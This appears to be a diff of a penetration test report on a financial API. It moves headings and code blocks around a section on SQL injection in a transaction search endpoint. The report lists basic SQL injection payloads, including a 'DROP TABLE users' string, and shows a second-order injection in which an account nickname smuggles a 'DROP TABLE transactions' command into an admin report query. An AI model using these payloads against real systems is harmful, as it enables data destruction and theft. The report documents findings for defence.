@@ -273,13 +273,20 @@ for user_id in range(10000, 50000):
 While modern ORMs provide some protection, raw queries remain a vulnerability vector. We identified a search endpoint accepting user input:
 
 ```shell
+GET /api/v1/transactions/search?query=<user_input>
+
+```
+
+**Testing Methodology:**
+
+```javascript
 # Basic SQL injection payloads
 ' OR '1'='1
 ' UNION SELECT NULL--
 '; DROP TABLE users--
 ```
 
-**Testing Methodology:**
+**Finding:** While classic SQL injection was mitigated by parameterized queries, we discovered **Second-Order SQL Injection** via the account nickname field:
 
 ```javascript
 // User updates account nickname
@@ -291,12 +298,6 @@ POST /api/v1/accounts/update
 // Later, when generating reports (admin function)
 // Query constructed insecurely:
 SELECT * FROM transactions WHERE account_nickname = 'My Savings'; DROP TABLE transactions; --'
-```
-
-**Finding:** While classic SQL injection was mitigated by parameterized queries, we discovered **Second-Order SQL Injection** via the account nickname field:
-
-```javascript
-
 ```
 
 **Business Impact:** Potential for database manipulation, data destruction, or exfiltration through time-based blind SQL injection. This was rated High rather than Critical due to requiring admin privileges for exploitation.
